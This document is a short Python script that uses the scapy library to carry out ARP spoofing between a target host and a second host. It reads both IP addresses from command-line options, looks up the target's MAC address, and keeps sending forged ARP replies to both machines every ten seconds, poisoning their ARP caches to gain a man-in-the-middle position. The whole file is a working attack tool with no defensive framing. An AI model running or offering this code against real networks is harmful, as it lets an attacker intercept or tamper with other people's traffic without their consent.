import scapy.all as scapy
import time
import optparse

def UserInput():
    parser = optparse.OptionParser()
    parser.add_option("-i","--target-ip",dest="ip",help="Enter target ip")
    parser.add_option("-sI","--spoof-ip",dest="spoofIp",help="Enter spoof ip")
    
    return parser.parse_args()

def arp_Spoof(target_ip,spoof_ip):
    target_mac = MacAdress(target_ip)
    arpResponse = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=spoof_ip )
    scapy.send(arpResponse,verbose=False)
    print("Packet Received.")

def ArpRequest(IPAdress):
    arp_request = scapy.ARP(pdst=IPAdress)
    return arp_request

def MacBroadcast():
    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    return broadcast_packet 

def MacAdress(target_ip):
    combined_packet = ArpRequest(target_ip)/MacBroadcast()
    answerList = scapy.srp(combined_packet,timeout=1,verbose=False)[0]
    return(answerList[0][1].hwsrc)

if __name__ == "__main__":
    (userInput,arguments) = UserInput()
    if userInput.ip and userInput.spoofIp:
        while True:
            arp_Spoof(userInput.ip,userInput.spoofIp)
            arp_Spoof(userInput.spoofIp,userInput.ip)
            time.sleep(10)
    else:
        print("Please enter correct ip")
    